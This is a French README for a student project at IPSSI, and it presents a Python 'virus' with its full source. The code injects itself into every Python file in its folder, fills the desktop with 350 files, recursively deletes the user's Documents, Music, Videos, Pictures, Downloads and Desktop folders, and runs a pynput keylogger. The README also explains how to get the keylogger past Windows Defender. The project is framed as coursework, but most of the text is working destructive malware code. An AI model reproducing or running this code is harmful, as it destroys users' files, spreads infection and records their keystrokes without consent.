# Virus-Python-IPSSI
<!-- Image centrée -->

<div align="center">

![CAPTURE](https://zupimages.net/up/22/48/4n0h.png)

</div>

<!-- --------------------------- -->

**Virus-Python-IPSSI** a été réalisé dans le cadre pédagogique de l'IPSSI avec un projet sur 1,5 jours. 

>Un virus est un programme informatique malveillant dont l'objectif est de perturber le fonctionnement normal d'un système informatique à l'insu de son propriétaire

**Veuillez vous rendre sur https://github.com/IPSSI-Jean/Virus-Python-IPSSI pour avoir une vue globale sur le projet et sur l'affichage du README**

# Prérequis
- Visual studio code

- Python3

- Connaissances basique / intermédiaire en Python

Il est recommandé d'exécuter ce programme dans un environnement virtuel, il est possible d'en mettre un en place à l'aide des logiciels suivants : 
- Virtualbox --> Sur une VM Windows / Linux
- VMWare workstation pro --> Sur une VM Windows / Linux
- ...

# Description du projet

### Architecture du projet 

Le projet repose sur 1 fichiers Python, 1 fichier de test en .py : 

- ```virus.py``` --> Qui contient le code du virus

- ```test.py``` --> Qui est vide, il sera remplis par le code injécté du virus

### Fonctionnement du projet

Le projet déroule en plusieurs étapes :

1) Exécution du code par la victime

2) Le virus va alors **injecter son code** dans tous les fichiers ```.py``` ou ```.pyw``` qu'il verra.

3) Le virus **va changer le fond d'écran** de la victime

4) Le virus va créer **350** fichiers texte sur le bureau contenant chacun le même texte

5) Le virus va ouvrir plusieurs **CMD**. 

### Mise en réseau
Ce projet se déroule entièrement en **local**.

# Axes d'améliorations du code
Après la phase de réalisation du projet, le professeur nous a demandé une personnalisation du code afin d'améliorer ce dernier.

Pour ce projet, les améliorations suivantes ont été mises en place :

- [x] Spam de fichiers texte sur le bureau de l'utilisateur actif
- [x] Enregistreur de frappes ( Keylogger )
- [x] Supression de tous les fichiers utilisateur (Bureau,Musique,Vidéos,Photos,Téléchargements,Documents)

# Mise en place de l'environement de travail

Il est conseillé, pour travailler dans de bonnes conditions, d’ouvrir un **répertoire de travail** ( sur le bureau ou autre ) sur Visual Studio Code

Une fois le répertoire créé, dans visual studio code il faut cliquer sur ```Fichier``` → ```Ouvrir le dossier```

Une fois cette étape réalisée il suffit d'importer les fichiers .py dans le répertoire de travail et l'exécution est désormait possible

# Explications sur le code

## Mise en place des délimiteurs

Au tout début du fichier virus.py, il faut déclarer les commentaires suivants, ils serviront de délimiteur pour la partie *auto-réplication* et *infection des fichiers* expliqués plus bas 

**SENSIBLE À LA CASSE**

```python
# DebutVirus

#Code a injécter

# FinVirus
 ```

## Auto-réplication

La première partie du code concerne l'auto-réplication de ce dernier.

```python
#Le virus charge son propre code
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

# Permet de vérifier le code du virus "# DebutVirus" et "# FinVirus\n" servent de délimiteurs
EstInfecte = False
for line in lines:
    if line == "# DebutVirus":
        EstInfecte = True
    if not EstInfecte:
        virus_code.append(line)
    if line == "# FinVirus\n":
        break
```

## Infection des fichiers

Cette seconde partie du code permet de détecter et d'injecter le code préparé en amont

```python
#----------Infection de fichiers----------

# Détection des fichiers .py et .pyw
seek_Python_Files = glob.glob('*.py') + glob.glob('*.pyw')

for file in seek_Python_Files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    corrompu = False
    #Si il y a # DebutVirus\n au début = NE PAS injecter le code
    for line in file_code:
        if line == "# DebutVirus\n":
            corrompu = True
            break
    
    #Si il n'y a pas # DebutVirus\n au début = injecter le code
    if not corrompu:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        
        with open(file, 'w') as f:
            f.writelines(final_code)

print("")
print("Infection des fichiers en cours ...")
print("")

#----------------------------------------
```

## Spam des fichiers textes sur le bureau

La partie suivante du code va spammer le bureau de l'utilisateur actif en écrivant 350 fichiers texte contenant eux même du texte

```python
#----------SPAM fichiers bureau----------

#Aller sur le bureau de l'utilisateur actuel
path = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))

print("INFECTION DU BUREAU EN COURS...")

#Création de 350 fichiers texte 
for x in range(350):
    file = open(path+"\INFECTED-IPSSI-%d.txt" % x, "w")
    file.write("Votre PC à été infécté par un étudiant de l'IPSSI")
    file.close()

#----------------------------------------
```
## Supression des fichiers utilisateurs

Pour cette dernière partie du code, le virus va ouvrir se rendre dans les dossiers de l'utilisateur (Bureau,Musique,Vidéos,Photos,Téléchargements,Documents) et supprimer tous les fichiers

```python
    #----------------Delete les fichiers utilisateur---------------

    #ignore_errors=True = Delete aussi les read only files
    pathDocument = str(os.path.join(os.environ['USERPROFILE'], "Documents"))
    shutil.rmtree(pathDocument, ignore_errors=True)

    pathMusic = str(os.path.join(os.environ['USERPROFILE'], "Music"))
    shutil.rmtree(pathMusic, ignore_errors=True)

    pathVideos = str(os.path.join(os.environ['USERPROFILE'], "Videos"))
    shutil.rmtree(pathVideos, ignore_errors=True)

    pathPictures = str(os.path.join(os.environ['USERPROFILE'], "Pictures"))
    shutil.rmtree(pathPictures, ignore_errors=True)

    pathDownloads = str(os.path.join(os.environ['USERPROFILE'], "Downloads"))   
    shutil.rmtree(pathDownloads, ignore_errors=True)

    pathDesktop = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))   
    shutil.rmtree(pathDesktop, ignore_errors=True)
```

## Keylogger

Cette partie du code va ouvrir un keylogger qui enregistrera **TOUTES** les frappes de la victime, ce dernier est très simplifié pour ne pas faire un projet dédié keylogger au sein du fichier, il est cependant tout à fait possible ( et simple ) d'implémenter un keylogger non détécté


Il est donc détécté par Windows defender, afin de le tester il suffit de cliquer sur " autoriser sur l'appareil " dans Windows Defender puis " Intervenir "

```python
#----------------KEYLOGGER---------------

# Un simple keylogger qui est détécté par Windows ( afin d'éviter un immense code dédié )
# Il est tout à fait possible ( et simple ) d'implémenter un keylogger non détécté

#Installation du module pynput
os.system('python -m pip install pynput')

from pynput.keyboard import Key, Listener
import logging
 
 #Enregistrement des frappes de l'utilisateurs dans un fichier local keylog.txt
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
```